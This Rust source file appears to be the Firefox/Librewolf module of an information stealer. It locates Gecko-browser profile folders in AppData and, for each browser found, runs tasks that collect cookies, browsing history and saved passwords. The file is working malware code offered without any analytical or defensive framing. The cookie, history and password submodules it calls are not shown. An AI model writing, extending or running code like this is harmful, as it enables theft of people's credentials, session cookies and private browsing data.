mod cookies;
mod history;
mod passwords;

use crate::vec;
use alloc::sync::Arc;
use alloc::vec::Vec;
use core::ops::Deref;
use tasks::{composite_task, CompositeTask, Task};
use utils::path::Path;
use crate::gecko::cookies::CookiesTask;
use crate::gecko::history::HistoryTask;
use crate::gecko::passwords::PasswordsTask;

pub struct GeckoTask<'a> {
    tasks: Vec<(Arc<GeckoBrowserData<'a>>, CompositeTask)>
}

impl GeckoTask<'_> {
    pub(crate) fn new() -> Self {
        let all_browsers = get_gecko_browsers();
        let mut tasks = Vec::new();
        
        for base_browser in all_browsers {
            let Some(browser) = get_browser_data(base_browser) else {
                continue
            };
            
            let browser = Arc::new(browser);
            
            tasks.push((
                browser.clone(),
                composite_task!(
                    CookiesTask::new(browser.clone()),
                    HistoryTask::new(browser.clone()),
                    PasswordsTask::new(browser.clone())
                )
            ))
        }
        
        Self { tasks }
    }
}

impl Task for GeckoTask<'_> {
    unsafe fn run(&self, parent: &Path) {
        for (browser, task) in &self.tasks {
            let parent = parent / browser.name;
            unsafe { task.run(&parent) }
        }
    }
}

fn get_browser_data(browser: GeckoBrowser) -> Option<GeckoBrowserData> {
    if !browser.base.is_exists() {
        return None;
    }
    
    let profiles = (&browser.base / "Profiles")
        .list_files_filtered(&|f| f.is_dir())?;
    
    if profiles.is_empty() {
        None
    } else {
        Some(GeckoBrowserData {
            inner: browser,
            profiles
        })
    }
}

struct GeckoBrowserData<'a> {
    inner: GeckoBrowser<'a>,
    profiles: Vec<Path>
}

impl<'a> Deref for GeckoBrowserData<'a> {
    type Target = GeckoBrowser<'a>;

    fn deref(&self) -> &Self::Target {
        &self.inner
    }
}

struct GeckoBrowser<'a> {
    name: &'a str,
    base: Path
}

macro_rules! browser {
    ($name:expr, $path:expr) => {
        GeckoBrowser { name: $name, base: $path }
    };
}

fn get_gecko_browsers<'a>() -> [GeckoBrowser<'a>; 2] {
    let appdata = Path::appdata();
    
    [
        browser!("Firefox", &appdata / "Mozilla" / "Firefox"),
        browser!("Librewolf", &appdata / "librewolf"),
    ]
}